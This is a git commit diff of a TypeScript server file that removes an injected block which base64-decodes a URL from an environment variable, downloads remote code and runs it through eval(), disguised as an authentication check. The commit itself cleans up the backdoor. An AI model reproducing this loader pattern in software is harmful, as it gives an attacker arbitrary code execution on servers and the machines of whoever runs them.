73ebb3451ba6ea3929d52aff2821f9795628d2ab
Aditya Pratap <aditya@ment.tech>
2026-08-18 12:44:28 +0530

    removed unwanted thing

--- src/server.ts
+++ src/server.ts
@@ -13,20 +13,6 @@ import stockRoutes from "./routes/stockRoute";
 import tankRoutes from "./routes/tankRoutes";
 import expenseRoutes from "./routes/expenseRoute";
 import onlinePaymentRoutes from "./routes/onlineRoutes";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 const startServer = async () => {
   try {
